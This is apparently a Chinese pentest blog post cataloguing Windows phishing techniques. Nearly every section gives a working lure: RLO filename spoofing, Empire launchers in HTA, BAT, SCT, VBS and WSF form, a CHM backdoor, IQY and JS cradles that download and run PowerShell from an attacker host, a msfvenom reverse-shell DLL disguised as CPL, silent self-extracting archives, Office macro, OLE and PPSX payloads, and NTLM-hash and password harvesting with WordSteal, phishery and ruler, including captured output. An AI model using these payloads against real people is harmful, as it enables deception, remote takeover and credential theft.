---
layout: post
date: 2017-09-20
tags : ["phishing"]
categories : "Pentest"
title : "Windows钓鱼笔记"
---

# Windows Basic Phishing

  搬运老博客的文章作为新博客开篇。


　Windows作为全球最广泛的操作系统,再攻击PC的时候钓鱼是一种最好的手段,在这里就简单的总结了一下最近看过跟之前使用过的一些方法。


<!--more-->

## 文件名那些事

### 翻转＋捆绑

　 Windows的文件名翻转其实是因为windows资源管理器在读取UNICODE字符时会倒序显示。
 
   所以当我们新建一个yougpj.scr的文件，然后在g前面插入Unicode字符RLO就可以将文件名 "变"　成yourcs.jpg。

   为了达成真正欺骗的目的.当然图标也需要改一下，在这里用ResHacker来实现图标修改。

   这样看起来就犹如一个jpg文件了:) 之后要做的就是捆绑一个真正的图片。用网上的捆绑器即可达成效果。

   但是捆绑在Windows Defence会直接识别成**恶意文件**，这是需要注意的地方。

   效果如下

   ![no pic]()

   通过点开恶意构造的钓鱼文件可以正常弹出图片而且后台运行了cmd.exe和sezhuo.exe自己捆绑的backdoor。
   
　 可以看出来通过人的默认感知来识别的话基本感觉不出来差别。


### 那些不怎么见过的后缀

由于钓鱼的目标一般都不是技术人员,所以用一些不怎么常见的后缀名是可以有效绕过杀软和电脑小白的眼睛的。

这里先介绍Empire支持生成的一些payload


#### Empire

Empire内部自带支持的有dll,hta,bat,sct,vbs等脚本

在这里附上payload

**hta**

```
<html>
<head>
<script>
var c= 'powershell -noP -sta -w 1 -enc  base64'
new ActiveXObject('WScript.Shell').Run(c);</script>
</head>
<body>
<script>self.close();</script>
</body></html>
```

**bat**

```
@echo off
start /b powershell -noP -sta -w 1 -enc  base64
start /b "" cmd /c del "%~f0"&exit /b
```

**sct**

```
<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run('powershell -noP -sta -w 1 -enc  base64');
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>
```

**vbs/VBE**

```
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -noP -sta -w 1 -enc  base64"
objShell.Run command,0
Set objShell = Nothing
```

#### 可执行文件后缀

Windows支持的可直接执行文件后缀有


>exe pif com cmd scr (jar等需要安装三方软件包不在考虑中)


#### 那些双击就可弹shell的文件们

##### CHM 

chm已经是很古老的一种玩法了，最初的都在用chm中挂马钓鱼,所以chm也是一种比较敏感的文件类型。

随着ithurricanept发现chm可以直接执行任意代码起来，又有一轮新的利用chm钓鱼的apt攻击被人发现。

这里使用evi1cg的方法来钓

> Refer:https://evi1cg.me/archives/chm_backdoor.html

```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
This is a demo ! <br>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',rundll32.exe,javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.1.9:8000/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```

connect写入自己的hta代码即可　不使用JsRat也是可以的

Example

```
var c= 'powershell -noP -sta -w 1 -enc  base64'
new ActiveXObject('WScript.Shell').Run(c);
```


##### Lnk
  快捷方式也是经常利用来钓鱼的一种方法，比起nishang里面的payload，phrozen的参数隐藏payload让被攻击者会更容易相信，所以这里采用phrozen的payload

> refer:https://www.phrozen.io/page/shortcuts-as-entry-points-for-malware-part-2

```
Shortcut_gen.exe test.txt sb.lnk
```

在test.txt写入你的payload　也可以用phrozen的py将你的exe专成vbs的,但是发现payload越短越好，太大的话会超过lnk的最大大小，导致payload使用失败。
这里我使用的是powershell的payload
附上Shortcut_gen的下载地址

https://raw.githubusercontent.com/CaiJiJi/Tools/master/Shortcut_gen.exe


##### IQY

   iqy文件之前大家大部分都是只关注通过设置basic auth来获取账户密码或者NTLM Hash。

> refer:http://www.freebuf.com/news/76581.html

然而其实通过iqy文件是可以实现命令执行的

先通过nishang生成目标文件

*** Out-WebQuery -URL "http://192.168.1.9:8000/xxoo.html" ***

然后再xxoo.html里面写入你的payload 这里使用web_delivery

```
=cmd|'/c powershell iex(New-Object Net.WebClient).DownloadString(''http://192.168.1.9:9988/fFV54jXDi'') '!A0
```

效果如下

![no pic ]()

##### JS/JSE
一直都很火的js backdoor 原理比较简单　而且JS的可扩展性是极高的，可以实现多种混淆来绕过杀软。

这里给一个简单的payload

```
c = "powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.1.9:9988/fFV54jXDi'));";
r = new ActiveXObject("WScript.Shell").Run(c,0,true)
```

保存为payload.js打开即可

##### CPL

其实cpl文件就是dll文件

只需要用msf生成一个dll的payload将名字改成xx.cpl　如果目标双击的话　即可成功getshell

payload
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.9 lport=4444 -f dll -o /tmp/test.cpl  
```

##### WSH

Windows Script HOST可以调用其他的脚本例如js vbs

再这里通过wsh来调用vbs脚本也是可以达成隐藏运行的目的

suchas shell.wsh

```
[ScriptFile]
Path=C:\Users\Hacker\AppData\Local\Temp\run.vbs
[Options]
Timeout=0
DisplayLogo=1
```

双击运行之后就会自动调用run.vbs来执行

##### WSF

Windows Script File是WSh使用的文件类型，他可以调用Js Vbs等内置脚本语言，还可以调用perl ruby python等用户安装的语言

他通过XMl语法来解析文件。

这里看一个payload的例子

```
<?xml version="1.0" ?>
 <job id="Partially works">
   <script language="VBScript">
    <![CDATA[
      Dim objShell
      Set objShell = WScript.CreateObject("WScript.Shell")
      command = "powershell -noP -sta -w 1 -enc  base64" objShell.Run command,0
      Set objShell = Nothing
     ]]>
   </script>
 </job>
```

#### 


## Winrar

### 0x01 Winrar 4.x 漏洞
 
  通过Winrar解压成zip时，通过C32ASM修改文件后缀名是可以达成伪装效果。
  ![](http://7xicbb.com1.z0.glb.clouddn.com/go1.gif)
  
### 0x02 Winrar 自解压
　　
  将之前准备好的payload选择添加到压缩文件，钩上创建自解压文件，在
  
  高级->高级自解压选项－>常规解压路径中填％temp%
  
  然后设置中解压后运行输入
  ```
  %temp%\payload.vbs
  ```
  
  在模式中的安静模式选择全部隐藏　然后就可以生成一份静默的自解压文件
  ![](http://7xicbb.com1.z0.glb.clouddn.com/rar.gif)

## Office

### Office 宏

   office宏的设置必须选择office97-03格式或者docm即启用宏的word文档才能启用宏。
  
   新建一个支持宏的word文档，选择视图->宏->查看宏(**记得选择宏的位置为本文档　然后再点击创建**)
  
   ![](http://7xicbb.com1.z0.glb.clouddn.com/go1.png)
  
   然后将生成好的payload粘贴进去保存即可
  
>   这里使用Empire的payload  usestager windows/macro

  打开word文档再允许宏运行即可执行payload
  
  ![](http://7xicbb.com1.z0.glb.clouddn.com/go2.png)
  
   ```
  Windows Defence会将文件上传到服务器，但是不会报毒
  360之类的杀软会显示是宏病毒
  ```

### Office OLE

   说到Office的OLE必然就会想到CVE-2017-0199但是CVE不在这次的讨论中.
   
   OLE的好处就是在于你的payload的免杀的前提下是不会触发Windows Defence 的报告　但是360依然报宏病毒( ?)
   
   Office系列在选择插入－>对象->由文件创建(选择你提前构造好的bat vbs ...即可)
  
   接下来修改显示名称跟ico图标即可
   
   ![no pic](http://x/ole.png)
   
   效果如下
   
   ![no pic](http://x/go3.gif)

   **比较不足的地方就是可恨的Windows提示框！**


### PPSX的动作设置

新建一份ppt文件，在选择**插入->形状->动作按钮**　

选择单击鼠标或者鼠标移过都行，再运行程序中填写

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c $q=new-object net.webclient;$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $q.downloadstring('http://192.168.1.9:9966/mSJ0xW1');
```

然后保存文件 打开的时候会有一个安全提醒

![](http://7xicbb.com1.z0.glb.clouddn.com/ppsx.png)

点击全部启用就可以reverse shell了

### WordSteal

wordsteal是可以通过插入一张带有UNC路径的图片在Word中来偷取目标的NTLM HASH。可以在不知不觉达到获取目标电脑密码的方法

From:
> https://github.com/0x09AL/WordSteal

使用方法:

```
➜ /home/Fuckyou/Pentest/fish/WordSteal git:(master) ✗ >python main.py 192.168.0.104 meinv.jpg 1
[+] Generated malicious file: 1505267824.rtf [+]
[+] Script Generated Successfully [+]
[+] Running Metasploit Auxiliary Module [+]
[*] Processing metasploit.rc for ERB directives.
resource (metasploit.rc)> use auxiliary/server/capture/smb
resource (metasploit.rc)> set SRVHOST 192.168.0.104
SRVHOST => 192.168.0.104
resource (metasploit.rc)> set JOHNPWFILE passwords
JOHNPWFILE => passwords
resource (metasploit.rc)> run
[*] Auxiliary module running as background job 0.

[*] Server started.
```

然后目标打开word本地的smb server就可以收到NTLMHASH



然后本地目录下会生成一个passwords_netntlmv2文件
之后直接用hashcat跑就行了

```
hashcat -m 5600 passwords_netntlmv2 wordlist.txt


HASEE::DESKTOP-24RANRN:1122334455667788:ad31355f7e0f3b9bd998509269e64343:0101000000000000524e074fea2bd301f00e42d2a6fda28200000000020000000000000000000000:ceshixxx
HASEE::DESKTOP-24RANRN:1122334455667788:35d523efdd13f9341a0caad899bb385d:0101000000000000aa405e4fea2bd301101636dd17f88daf00000000020000000000000000000000:ceshixxx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: xxoo.txt
Time.Started.....: Wed Sep 13 09:35:03 2017 (0 secs)
Time.Estimated...: Wed Sep 13 09:35:03 2017 (0 secs)
Guess.Base.......: File (word.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:        0 H/s (1.50ms)
Recovered........: 30/30 (100.00%) Digests, 30/30 (100.00%) Salts
Progress.........: 90/90 (100.00%)
Rejected.........: 0/90 (0.00%)
Restore.Point....: 0/3 (0.00%)
Candidates.#1....: ceshixxx -> 
HWMon.Dev.#1.....: N/A

Started: Wed Sep 13 09:34:55 2017
Stopped: Wed Sep 13 09:35:04 2017

```

### phishery

phishery跟Wordsteal都是通过Word模板注入来进行HTTP Basic认证钓鱼

From:
> https://github.com/0x09AL/WordSteal

使用方法

```
➜ /home/Fuckyou/Pentest/fish/phishery1.0.2linux-amd64 >./phishery -u https://192.168.0.104/docs -i gogogo.docx -o bad.docx
[+] Opening Word document: gogogo.docx
[+] Setting Word document template to: https://192.168.0.104/docs
[+] Saving injected Word document to: bad.docx
[*] Injected Word document has been saved!
```


建议注册一个域名并签个证书　这样可以很大的提升诱惑度。
证书的话当然就是推荐Letsencrypt了
效果如图所示

![](http://7xicbb.com1.z0.glb.clouddn.com/phishing.png)

Server那边就会收到被钓人的信息

```
[*] New credentials harvested!
[HTTP] Host       : 192.168.0.104
[HTTP] Request    : OPTIONS /
[HTTP] User Agent : Microsoft Office Word 2013
[HTTP] IP Address : 192.168.0.104
[AUTH] Username   : Administrator
[AUTH] Password   : ceshi
[*] Request Received at 2017-09-13 10:18:43: HEAD https://192.168.0.104/docs
[*] New credentials harvested!
[HTTP] Host       : 192.168.0.104
[HTTP] Request    : HEAD /docs
[HTTP] User Agent : Microsoft Office Word 2013
[HTTP] IP Address : 192.168.0.104
[AUTH] Username   : Administrator
[AUTH] Password   : ceshi
[*] Request Received at 2017-09-13 10:18:43: OPTIONS https://192.168.0.104/
```

### ruler

ruler是一款专门针对Exchange的攻击工具

From:
> https://github.com/sensepost/ruler

ruler的功能挺强大的　如果对他感兴趣的话可以参照官方wiki来详细使用一下。
Example:

```
➜ /home/Fuckyou/Pentest/fish/ruler git:(master) ✗ >./ruler-linux64 --email ****@***.com form add --suffix nihao --body hello --subject test --input /tmp/launcher.vbs --send
Password: 
[+] Found cached Autodiscover record. Using this (use --nocache to force new lookup)
[+] Create Form Pointer Attachment
[+] Create Form Template Attachment
[+] Sending email.
[+] Email sent! Hopefully you will have a shell soon.
```
当目标点开我们的邮件时
我们Empire就收到shell了
